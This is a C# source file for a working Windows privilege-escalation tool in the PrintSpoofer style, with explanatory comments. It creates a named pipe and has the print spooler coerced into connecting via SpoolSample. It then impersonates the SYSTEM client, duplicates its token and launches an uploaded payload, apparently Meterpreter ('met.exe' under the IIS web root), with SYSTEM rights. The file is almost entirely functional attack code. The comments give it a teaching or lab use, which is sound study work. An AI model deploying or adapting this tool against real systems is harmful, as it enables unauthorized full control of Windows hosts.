using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;


/*
 * Once compiled, execute like: Impersonate_Pipe_server.exe \\.\pipe\test
 *
 * To simulate a connection, use an elevated command prompt and write to the pipe. i.e. echo hello > \\localhost\pipe\test
 * Switch back to the command prompt running your application to see the SID.
 * 
 * Anyone who connecting to your pipe can be impersonated.
 * 
 * Try \\.\appsrv01\test\pipe\spoolss
 * Then on another command prompt, run SpoolSample.exe or an application ran by SYSTEM account. See what happens.
 * For SpoolSample.exe, an i.e. SpoolSample.exe appsrv01 \\appsrv01/pipe/test
 * C# for SpoolSample - https://github.com/leechristensen/SpoolSample
 * PS - https://github.com/vletoux/SpoolerScanner
 * 
 */

namespace Impersonate_Pipe_Server
{
    internal class Program
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        /*
         * 
         * HANDLE CreateNamedPipeA(
              LPCSTR                lpName,
              DWORD                 dwOpenMode,
              DWORD                 dwPipeMode,
              DWORD                 nMaxInstances,
              DWORD                 nOutBufferSize,
              DWORD                 nInBufferSize,
              DWORD                 nDefaultTimeOut,
              LPSECURITY_ATTRIBUTES lpSecurityAttributes
            );

            An API to create a pipe, returns a handle for subsequent pipe operations.
            A pipe refers to a communication channel used for inter-process communication (IPC). For this instance, we refer it for communication channel between processes.
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(
            string lpName, //Follow a standardized name format i.e. \\.\pipe\pipename. Must be unique on the system.
            uint dwOpenMode, //Describes the mode the pipe communicates in i.e bi-directional, client-to-server, server-to-client. Refer: https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea#:~:text=The%20open%20mode
            uint dwPipeMode, //Describes the mode the pipe operates in. i.e. data written, data read, and whether pipe accepts remote client connections.
            uint nMaxInstances, //Maximum number of instances for the pipe.
            uint nOutBufferSize, //Define the # of butyes to use for output buffer
            uint nInBufferSize, //Like above, but for input buffer
            uint nDefaultTimeOut, //Time-out value
            IntPtr lpSecurityAttributes //SID detailing that clients can interact with the pipe. Set to NULL for SYSTEM and local administrators to access it.
        );

        /*
         * BOOL ConnectNamedPipe(
                HANDLE       hNamedPipe,
                LPOVERLAPPED lpOverlapped
            );
         * Connect named pipe.
         * 
         */
        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(
            IntPtr hNamedPipe, //Handle to the pipe returned by CreateNamedPipe 
            IntPtr lpOverlapped //Pointer to a OVERLAPPED structure. Not needed. refer to OVERLAPPED - https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-overlapped
        );

        /*
         * BOOL ImpersonateNamedPipeClient(
              HANDLE hNamedPipe
            );
         * 
         * hNamedPipe - A handle to a named pipe
         * 
         * Function impersonates a named-pipe client application.
         */

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(
            IntPtr hNamedPipe
        );

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread(); //Obtain the current thread in the application.

        /*
         * 
         * BOOL OpenThreadToken(
              HANDLE  ThreadHandle,
              DWORD   DesiredAccess,
              BOOL    OpenAsSelf,
              PHANDLE TokenHandle
            );
         * 
         * To open impersonated token.
         * https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken
         */

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(
            IntPtr ThreadHandle, //Supply a handle to the thread assocaited with this token.
            uint DesiredAccess, //Level of access. For no issues, use TOKEN_ALL_ACCESS or 0xF01FF
            bool OpenAsSelf, //Whether to use security context of the proecss or thread. Set to false for thread.
            out IntPtr TokenHandle //Supply a pointer which will populate with a handle to the token that's opened.
        );

        /*
         * BOOL GetTokenInformation(
              HANDLE                  TokenHandle,
              TOKEN_INFORMATION_CLASS TokenInformationClass,
              LPVOID                  TokenInformation,
              DWORD                   TokenInformationLength,
              PDWORD                  ReturnLength
            );
         * 
         * 
         * 
         */
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle, //Token obtained from OpenThreadToken
            uint TokenInformationClass, //Specifies the type of information we want to obtain. refer: https://learn.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_information_class
            IntPtr TokenInformation, //Pointer to the output buffer that will be populated by the API
            int TokenInformationLength, //Size of the output buffer
            out int ReturnLength //This value will be populated with the required size as listed above.
        );

        /*
         * BOOL ConvertSidToStringSidW(
              PSID   Sid,
              LPWSTR *StringSid
            );
         * 
         * 
         * Convert the binary SID to a SID string.
         * 
         */

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(
            IntPtr pSID, //Pointer to the SID, we pass the output buffer that was populated by GetTokenInformatoin.
            out IntPtr ptrSid   //Supply the output string. 
        );

        /*
         * BOOL DuplicateTokenEx(
              HANDLE                       hExistingToken,
              DWORD                        dwDesiredAccess,
              LPSECURITY_ATTRIBUTES        lpTokenAttributes,
              SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
              TOKEN_TYPE                   TokenType,
              PHANDLE                      phNewToken
            );
         *
         *  An API to create a primary token from an impersonation token and create a new process in the context of the impersonated user.
         */
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken, //Supply the impersonation token from OpenThreadToken
            uint dwDesiredAccess, //Level Access - Full access to the token use 0xF01FF
            IntPtr lpTokenAttributes, // Security descriptor for the token. Use NUll to set the default SD.
            uint ImpersonationLevel,  //Access Type to the token. We can set this to "2" which is SecurityImpersonation
            uint TokenType, //Set TokenType, specify a primary token (TokenPrimary) to "1"
            out IntPtr phNewToken //A pointer that will populate with the handle to the duplicated token.
        );

        /*
         * 
         * BOOL CreateProcessWithTokenW(
              HANDLE                hToken,
              DWORD                 dwLogonFlags,
              LPCWSTR               lpApplicationName,
              LPWSTR                lpCommandLine,
              DWORD                 dwCreationFlags,
              LPVOID                lpEnvironment,
              LPCWSTR               lpCurrentDirectory,
              LPSTARTUPINFOW        lpStartupInfo,
              LPPROCESS_INFORMATION lpProcessInformation
            );
         * 
         *AN  API can create a new process based on a token. The token must be a primary token
         * https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
         */
        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken, //Supply the token
            LogonFlags dwLogonFlags, //Default value is 0. Logon option.
            string lpApplicationName, //Name of the module to be executed.
            string lpCommandLine, //Command line to be executed.
            CreationFlags dwCreationFlags, //Control how the process is created.
            IntPtr lpEnvironment, //Pointer to an environment block for the new process
            string lpCurrentDirectory, //Full path to the current directory for the process.
            [In] ref STARTUPINFO lpStartupInfo, //A pointer to a STARTUPINFO or STARTUPINFOEX structure
            out PROCESS_INFORMATION lpProcessInformation //A pointer to a PROCESS_INFORMATION structure that recevies identification information for the new process.
        );

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        //revert back to impersonated SYSTEM token.
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        /* UINT GetSystemDirectoryW(
              LPWSTR lpBuffer,
              UINT   uSize
            );
         * 
         * Acccepts string buffer that populates with system directory.
         */
        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory(
            [Out] StringBuilder lpBuffer, 
            uint uSize
            );
        /*
         *BOOL CreateEnvironmentBlock(
          LPVOID *lpEnvironment,
          HANDLE hToken,
          BOOL   bInherit
        ); 
         * 
         * Allows the creation of an environment block. Necessary step to implement when working with non-interactive login
         */
        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(
            out IntPtr lpEnvironment, //An output pointer to the created environment block 
            IntPtr hToken, //User token, we'll plan to have the SYSTEM token after priv escalation
            bool bInherit //Whether inherit from current process env is allowed. Set false, as we don't have an environment on our process.
            );

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename \n i.e. \\\\.\\pipe\\pipeline");
                return;
            }
            string pipeName = args[0];
            /*
             *  Arg 1 - Name
             *  Arg 2 - Set to 3 (or PIPE_ACCESS_DUPLEX) for bi-directional communication
             *  Arg 3 - Set to 0 (or PIPE_TYPE_BYTE) for write and ready bytes. Additionally, this enable PIPE_WAIT blocking mode.
             *  Arg 4 - Set anywhere between 1 to 255, 10 is fine.
             *  Arg 5 - One memory page (0x1000 bytes)
             *  Arg 6 - Set to 0 for no time-out
             *  Arg 7 - Set to IntPtr.Zero for null
             */
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            //Set lpOverlapped to null
            //Once this function is executed, the application will wait for any incoming pipe client.
            ConnectNamedPipe(hPipe, IntPtr.Zero);

            /*
             * Once a connection is made, the application will move on to calling ImpersonateNamedPipeClient to impersonate the client.
             * Ideally, code will start a pipe server, listen for incoming connection, then impersonate them.
             */
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            //Provide 0xF01FF to get full access to the token.
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            //Set TokenInformationClass to "1" to obtain the SID. Pass in the token handler, and reference the TokenInfLength for TokenInformationLength and ReturnLength to get a required size.
            //This step will allocate an appropriate buffer, we'll need to call teh API twice to allocate a  TokenInformation buffer.
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);

            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            //Identical to previous, but provide a TokenInformation pointer.
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            //Extract the SID in the output buffer from TokenInformation
            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            //Convert the SID to string SID
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            //Convert the pointer to string
            string sidstr = Marshal.PtrToStringAuto(pstr);
            //a SID in string.
            Console.WriteLine(@"Found sid {0}", sidstr);

            IntPtr hSystemToken = IntPtr.Zero;
            //Set full acesss (i.e. 0xF01FF), Set null for default SD, Set IMpersonationLevel to SecurityImpersonation (2), Set TokenType to primary token (1)
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            //Get the system directory
            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256);
            
            //Create an environment block for CreateProcessWithTokenW
            IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);

            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine("Impersonated user is: " + name);

            //This function is call is useful when certain processes running in SYSTEM context do not have impersonation privilege, but our current process i.e. IIS DefaultAppPool does. So we revert to it.
            RevertToSelf();

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            //
            si.lpDesktop = "WinSta0\\Default";
            /*
             * Set default of 0.
             * No application needed, can supply NULL
             * We'll use cmd.exe instead so supply that
             * Using default options for dwCreationFlags, IpEnvironment, IpCurrentDirectory. 0, NULL, and NULL.
             * For the two last arguments (lpStartupInfo and lpProcessInformation), pass the STARTUPINFO and PROCESS_INFORMATION structures
             * 
             * For non-interactive sessions
             * Change the dwLogonFlag to use LOGON_WITH_PROFILE logon flag 
             * Provide an enviornment block and specify the CREATE_UNICODE_ENVIRONEMTN creation flag if the block was made with unicode.
             * Next consider a desktops, or display surfaces, all processes have a desiganted desktop even  if its window is hidden.
             * Specify this in the IpDesktop field of the STARTUPINFO structure, we can use the default desktop WinSta0\Default and set it to the IpDesktop
             */
            res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\inetpub\\wwwroot\\Upload\\met.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);

        }
    }
}
